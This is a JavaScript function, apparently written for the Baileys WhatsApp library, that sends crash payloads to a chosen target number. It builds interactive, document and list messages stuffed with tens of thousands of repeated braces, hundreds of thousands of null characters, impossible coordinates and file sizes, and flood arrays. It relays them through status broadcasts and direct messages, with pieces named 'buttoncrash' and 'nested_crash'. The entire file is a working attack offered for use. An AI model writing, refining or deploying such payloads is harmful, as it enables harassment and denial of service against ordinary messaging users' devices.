async function ForceInvis(sock, target) {
  const invisContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.999999999999,
              name: "𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃",
              address: "زهروز ريي 𐌀𐌶𐌂𐌀𐌍𐌊 ✦𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃",
              jpegThumbnail: null
            },
            hasMediaAttachment: false
          },
          body: {
            text: "꙳͙͡༑ᐧ ̬..𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: []
          }
        }
      }
    }
  }), { userJid: target, quoted: null });

  await sock.relayMessage('status@broadcast', invisContent.message, {
    messageId: invisContent.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: 'meta', attrs: {}, content: [{
        tag: 'mentioned_users', attrs: {}, content: [{
          tag: 'to', attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });

  const forceContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "꙳͙͡༑ᐧ𐌀𐌶𐌂𐌀𐌍𐌊 ✦𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.999999999999,
              name: "𐌃𐌀𐌐𐌉𐌐 ✦",
              address: "𐌃𐌀𐌐𐌉𐌐 ✦",
              jpegThumbnail: null
            },
            hasMediaAttachment: false
          },
          body: {
            text: "𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: []
          },
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "QYxh+KzzJ0PayloadFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileLength: "9999999999999",
            pageCount: 1316134911,
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            fileName: "ZynXzo New",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
            mediaKeyTimestamp: "1726867151",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD..."
          }
        }
      }
    }
  }), { userJid: target, quoted: null });

  await sock.relayMessage('status@broadcast', forceContent.message, {
    messageId: forceContent.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: 'meta', attrs: {}, content: [{
        tag: 'mentioned_users', attrs: {}, content: [{
          tag: 'to', attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });

  const buttoncrash = {
    quotedMessage: {
      buttonsMessage: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: "9999999999999",
          pageCount: 3567587327,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃",
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
          mediaKeyTimestamp: "1735456100",
          caption: "\n"
        },
        contentText: "꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂",
        footerText: "\u0000".repeat(850000),
        buttons: [{
          buttonId: "𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃",
          buttonText: { displayText: "𐎟" },
          type: 1
        }],
        headerType: 3
      }
    }
  };

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: '\u0000',
          listType: 1,
          singleSelectReply: { selectedRowId: "id" },
          description: "𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃",
          contextInfo: {
            businessOwnerJid: "5511954801380@s.whatsapp.net",
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: "꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂",
            quotedMessage: buttoncrash.quotedMessage
          }
        }
      }
    }
  }, { participant: { jid: target } });

  const Neptune = JSON.stringify({
    status: true, active: true, criador: "$FriendMe",
    messageParamsJson: "{".repeat(10000),
    call_permission_request: {
      status: true, enabled: true, version: 3
    },
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 ", hasMediaAttachment: false },
          body: { text: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 ", format: "DEFAULT" },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(5000),
            buttons: [{
              name: "nested_call_permission",
              buttonParamsJson: JSON.stringify({
                status: true, power: "max", ping: 9999, cameraAccess: true
              })
            }]
          }
        }
      }
    },
    buttons: [
      {
        name: "nested_crash",
        buttonParamsJson: JSON.stringify({
          messageParamsJson: "{".repeat(15000), crash: true, overdrive: true
        })
      },
      {
        name: "multi_repeat",
        buttonParamsJson: JSON.stringify({
          status: true,
          payload: Array.from({ length: 100 }, () => "{".repeat(50)),
          cameraAccess: true
        })
      }
    ],
    flood: Array.from({ length: 1000 }, () => ({
      nulls: "\u0000".repeat(100), emojis: "🩸".repeat(20), status: true
    }))
  });

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 ", hasMediaAttachment: false
          },
          body: {
            text: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 " + "\u0000".repeat(30000),
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(15000),
            buttons: [
              { name: "single_select", buttonParamsJson: Neptune },
              ...Array.from({ length: 4 }, () => ({
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true, enabled: true, overload: true, cameraAccess: true
                })
              }))
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  const kontol = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: JSON.stringify({ status: true }),
              messageParamsJson: "{".repeat(10000),
              version: 3
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(kontol.to, kontol.message);
}